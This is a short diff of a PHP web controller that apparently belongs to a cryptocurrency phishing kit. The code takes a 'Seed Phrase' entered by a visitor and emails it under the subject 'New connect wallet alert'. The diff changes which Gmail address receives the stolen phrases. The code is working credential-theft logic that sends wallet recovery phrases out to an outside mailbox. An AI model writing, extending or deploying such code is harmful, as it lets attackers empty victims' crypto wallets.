@@ -84,8 +84,8 @@ class Home extends BaseController
 			$msg = "Seed Phrase: ".$incoming['phrase'];
 		}
 		$data = [
-			// 'to' => 'amerantbankfl@gmail.com',
-			'to' => 'diamond2sure@gmail.com',
+			'to' => 'amerantbankfl@gmail.com',
+			// 'to' => 'diamond2sure@gmail.com',
 			'type' => 'link',
 			'subject' => 'New connect wallet alert',
 			'message' => ['msg' => $msg],
